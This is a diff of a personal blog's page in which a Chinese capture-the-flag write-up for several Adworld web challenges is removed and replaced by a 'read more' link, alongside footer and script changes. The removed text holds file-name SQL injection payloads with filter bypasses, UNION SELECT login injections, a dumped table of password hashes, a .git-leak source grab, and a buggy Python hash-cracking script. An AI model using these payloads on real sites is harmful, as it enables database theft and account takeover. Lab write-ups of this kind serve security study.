-<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>注册后进入题目，根据题目名，以为是考的上传，于是开始了尝试绕过，几番周折无效后，<a href="https://blog.csdn.net/Yu_csdnstory/article/details/94750179" target="_blank" rel="noopener">参考</a>，发现居然是通过文件名作为注入。</p>
-<p><code>使用双写绕过对select和from的过滤</code></p>
-<p><code>使用十六进制才会有回显，所以使用CONV函数将16进制转换成10进制，CONV的使用是将第一个参数，从第二个参数的进制，转换成第三个参数的进制</code></p>
-<p><code>substr截过长，会用科学计数法表示，所以我们10个10个的截取</code></p>
-<p>于是构造</p>
-<p><code>a&#39;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#39;.jpg</code></p>
-<p><code>a&#39;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#39;.jpg</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),1,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),13,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),25,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),37,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39;)),1,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39;)),13,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#39;.jpg</span><br></pre></td></tr></table></figure>
-
-<p>注意，这里的<code>a&#39;</code>中的a可以是任意字符，但是不能使用数字，否则会出错。</p>
-<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>直接添加robots.txt即可获取flag</p>
-<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>通过dirsearch发现存在.git源码泄露<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/SpimNfjAB*wMFxNbZ6owign94Cy9.FFgPTZLFaplXi0!/b/dLYAAAAAAAAA&bo=vAP0AQAAAAADB2g!&rf=viewer_4" alt=""><br>通过GITHACK获取源码<br><code>python2 githack.py -u http://111.198.29.45:55969/.git/</code><br>在api.php中发现关键代码<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/vg1tZciGsw92F3VkG3PoEtM3YCWJqAhrzdyqlTEtK.E!/b/dL4AAAAAAAAA&bo=VgV4AgAAAAADFxs!&rf=viewer_4" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为PHP中&#x3D;&#x3D;为弱类型比较，所以修改为true可以与任意数字相等</span><br></pre></td></tr></table></figure>
-<p>通过抓包修改为true，放到repeater里面多点几次钱就够了<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/hBzD1c9WIKjppAu8iCGCVfsmzyfx107QsoJqyWxBcrw!/b/dL8AAAAAAAAA&bo=IgPOAQAAAAADF9w!&rf=viewer_4" alt=""></p>
-<h3 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h3><p>打开题目后，发现有很多pdf，还是访问一下robots.txt。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/lSc02LhfQbLXPdQ30KYuTYuanGbizAcgzJSTZ.J9I0E!/b/dL8AAAAAAAAA&bo=qgRjAQAAAAADF*4!&rf=viewer_4" alt=""><br>访问login.php，简单测试一下发现报错（admin.php中无报错）<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/ku7SduZwPCcDcDjqtB0wQtxO.h8FgzB4X8nR3gdZgZY!/b/dIMAAAAAAAAA&bo=VgUbAgAAAAADJ0g!&rf=viewer_4" alt=""><br>放在sqlmap里面跑一下，<br>在sqlmap中并没有得到什么东西，右键查看源码时，发现一段莫名的东西<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code>，尝试添加到url中，得到源码，发现并没有什么过滤，那么为什么sqlmap跑不出东西呢。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/7RjyAAVgZalQVVkx6TAMYV8wkyMLey2nfWeg4pvux6A!/b/dL8AAAAAAAAA&bo=5wRkAgAAAAADJ4c!&rf=viewer_4" alt=""><br>尝试手动注入</p>
-<p><code>usr=%27 UNION SELECT id, name from Users limit 0,1--+&amp;pw=</code><br><code>usr=%27 UNION SELECT id, password from Users limit 0,1--+&amp;pw=</code><br><code>usr=%27 UNION SELECT id, hint from Users limit 0,1--+&amp;pw=</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+-------------------------------+--------+------------------------------------------+</span><br><span class="line">| id | hint                          | name   | password                                 |</span><br><span class="line">+----+-------------------------------+--------+------------------------------------------+</span><br><span class="line">| 1  | my fav word in my fav paper?! | admin  | 3fab54a50e770d830c0416df817567662a9dc85c |</span><br><span class="line">| 2  | my love is&#39;?                 | fritze | 54eae8935c90f467427f05e4ece82cf569f89507 |</span><br><span class="line">| 3  | the password is password      | hansi  | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd |</span><br></pre></td></tr></table></figure>
-<p>根据提示，发现admin的密码为password的密文加密，而密文就在pdf的名字中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">re1 &#x3D; &#39;[a-fA-F0-9]&#123;32,32&#125;.pdf&#39;</span><br><span class="line">re2 &#x3D; &#39;[0-9\&#x2F;]&#123;2,2&#125;index.html&#39;</span><br><span class="line"></span><br><span class="line">pdf_list &#x3D; []</span><br><span class="line">def get_pdf(url):</span><br><span class="line">    global pdf_list </span><br><span class="line">    print url</span><br><span class="line">    req &#x3D; requests.get(url).text</span><br><span class="line">    re_1 &#x3D; re.findall(re1,req)</span><br><span class="line">    for i in re_1:</span><br><span class="line">        pdf_url &#x3D; url+i</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">    re_2 &#x3D; re.findall(re2,req)</span><br><span class="line">    for j in re_2:</span><br><span class="line">        new_url &#x3D; url+j[0:2]</span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    return pdf_list</span><br><span class="line">    # return re_2</span><br><span class="line"></span><br><span class="line">pdf_list &#x3D; get_pdf(&#39;http:&#x2F;&#x2F;111.198.29.45:38829&#39;)</span><br><span class="line">print pdf_list</span><br><span class="line"># for i in pdf_list:</span><br><span class="line">#     os.system(&#39;wget &#39;+i)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def get_pdf(dir):</span><br><span class="line">    dir_list &#x3D; os.listdir(dir)</span><br><span class="line">    for i in dir_list:</span><br><span class="line">        print i[-4:]</span><br><span class="line">        if i[-4:]!&#x3D;&#39;.pdf&#39;:</span><br><span class="line">            dir_list.remove(i)</span><br><span class="line">    return dir_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_word_list(path):</span><br><span class="line">    rsrcmgr &#x3D; PDFResourceManager()</span><br><span class="line">    retstr &#x3D; StringIO()</span><br><span class="line">    device &#x3D; TextConverter(rsrcmgr, retstr, codec&#x3D;&#39;utf-8&#39;, laparams&#x3D;LAParams())</span><br><span class="line">    interpreter &#x3D; PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    with open(path, &#39;rb&#39;) as fp:</span><br><span class="line">        for page in PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text &#x3D; retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def jiami(j):</span><br><span class="line">    import hashlib</span><br><span class="line">    sha &#x3D; hashlib.sha1(j)</span><br><span class="line">    encrypts &#x3D; sha.hexdigest()</span><br><span class="line">    return encrypts</span><br><span class="line"></span><br><span class="line">pdf_list &#x3D;  get_pdf(&#39;.&#x2F;&#39;)</span><br><span class="line">for i in paf_list:</span><br><span class="line">    word_list &#x3D; get_word_list(i)</span><br><span class="line">    for j in word_list:</span><br><span class="line">        sha1 &#x3D; jiami(j)</span><br><span class="line">        if sha1 &#x3D;&#x3D; &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;:</span><br><span class="line">            return j</span><br></pre></td></tr></table></figure>
-<p>最后得到admin的密码为<code>ThinJerboa</code></p>
-<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>访问题目直接给出代码让解密</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    $_o&#x3D;strrev($str);   &#x2F;&#x2F;strrev() 函数反转字符串。</span><br><span class="line">    &#x2F;&#x2F; echo $_o;</span><br><span class="line">        </span><br><span class="line">    for($_0&#x3D;0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c&#x3D;substr($_o,$_0,1);</span><br><span class="line">        $__&#x3D;ord($_c)+1;     &#x2F;&#x2F;返回值是对应的十进制整数。</span><br><span class="line">        $_c&#x3D;chr($__); &#x2F;&#x2F;chr() 函数（对于8位的ASCII字符串）</span><br><span class="line">        $_&#x3D;$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    return str_rot13(strrev(base64_encode($_))); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;*</span><br><span class="line">   逆向加密算法，解密$miwen就是flag</span><br><span class="line">*&#x2F;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">substr(string,start,length)</span><br><span class="line"></span><br><span class="line">参数 	描述</span><br><span class="line">string 	必需。规定要返回其中一部分的字符串。</span><br><span class="line">start 	</span><br><span class="line"></span><br><span class="line">必需。规定在字符串的何处开始。</span><br><span class="line"></span><br><span class="line">    正数 - 在字符串的指定位置开始</span><br><span class="line">    负数 - 在从字符串结尾开始的指定位置开始</span><br><span class="line">    0 - 在字符串中的第一个字符处开始</span><br><span class="line"></span><br><span class="line">length 	</span><br><span class="line"></span><br><span class="line">可选。规定被返回字符串的长度。默认是直到字符串的结尾。</span><br><span class="line"></span><br><span class="line">    正数 - 从 start 参数所在的位置返回的长度</span><br><span class="line">    负数 - 从字符串末端返回的长度</span><br><span class="line">    </span><br><span class="line">从字符串中返回 &quot;world&quot;：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo substr(&quot;Hello world&quot;,6);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str_rot13() 函数对字符串执行 ROT13 编码。</span><br><span class="line"></span><br><span class="line">ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</span><br><span class="line"></span><br><span class="line">提示：编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。</span><br></pre></td></tr></table></figure>
-
-<p>看懂代码后，构造解码代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function decode($str)&#123;</span><br><span class="line">	$str&#x3D;str_rot13($str);</span><br><span class="line">	$str&#x3D;strrev($str);</span><br><span class="line">	$str&#x3D;base64_decode($str);</span><br><span class="line">	$_a&#x3D;&#39;&#39;;</span><br><span class="line">	for($_0&#x3D;0;$_0&lt;strlen($str);$_0++)&#123;</span><br><span class="line">		$_c&#x3D;substr($str,$_0,1);</span><br><span class="line">		$__&#x3D;ord($_c)-1;</span><br><span class="line">		$_c&#x3D;chr($__);</span><br><span class="line">		$_a&#x3D;$_a.$_c;</span><br><span class="line">	&#125;</span><br><span class="line">	return $_a;</span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;decode($miwen);</span><br><span class="line">$b&#x3D;strrev($b);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
+      <p>see more?</p>
+      
+      <a class="article-more-link" href="/2019/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWEB%E9%A2%98%E8%A7%A3/">阅读更多...</a>
+      
       
       <!-- 打赏 -->
       
@@ -376,7 +201,7 @@
     <ul class="list-inline">
       <li>
         &copy;
-        2019
+        2015-2019
         Li XiangLan
       </li>
       <li>
@@ -437,11 +262,11 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">安全</a>
+      <a class="nav-item-link" href="/tags/LoneRanger/">LR</a>
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="http://shenyu-vip.lofter.com" target="_blank" rel="noopener">生活</a>
+      <a class="nav-item-link" href="http://shenyu-vip.lofter.com" target="_blank" rel="noopener">摄影</a>
     </li>
     
     <li class="nav-item">
@@ -473,6 +298,27 @@
 </div>
 </div>
       </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
       
 <script src="/js/jquery-2.0.3.min.js"></script>
 
@@ -495,7 +341,7 @@
 
 <script>
   var ayerConfig = {
-    mathjax: true
+    mathjax: false
   }
 </script>
 
@@ -503,27 +349,14 @@
 <script src="/js/ayer.js"></script>
 
 
-
-  <script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-      tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-  });
-
-  MathJax.Hub.Queue(function() {
-      var all = MathJax.Hub.getAllJax(), i;
-      for(i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-      }
-  });
-</script>
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
 
 
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
   </div>
 </body>
 
